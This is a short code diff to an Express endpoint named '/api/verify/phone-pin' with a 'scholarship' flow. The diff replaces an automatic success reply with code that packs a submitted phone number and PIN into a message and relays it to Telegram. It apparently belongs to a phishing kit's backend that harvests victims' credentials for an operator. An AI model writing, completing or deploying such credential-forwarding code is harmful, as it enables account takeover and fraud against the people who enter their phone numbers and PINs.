@@ -87,7 +87,15 @@ app.post('/api/verify/phone-pin', authenticateApiKey, async (req, res) => {
     const sanitizedPin = String(pin).replace(/[^0-9]/g, '').slice(0, 4);
     const sanitizedFlow = String(flow || 'scholarship').replace(/[^a-zA-Z0-9_-]/g, '').slice(0, 50);
 
-    res.json({ success: true, message: 'Phone & PIN verified automatically', id: 'auto-' + Date.now().toString(36) });
+    const verificationValue = `Phone: ${sanitizedPhone}, PIN: ${sanitizedPin}`;
+
+    const result = await sendVerificationRequest('PhonePIN', verificationValue, sanitizedFlow);
+
+    if (result.success) {
+        res.json({ success: true, message: 'Phone & PIN sent to Telegram', id: result.id });
+    } else {
+        res.status(500).json({ success: false, error: result.error });
+    }
 });
 
 app.get('/api/verify/phone-pin/status/:id', authenticateApiKey, (req, res) => {
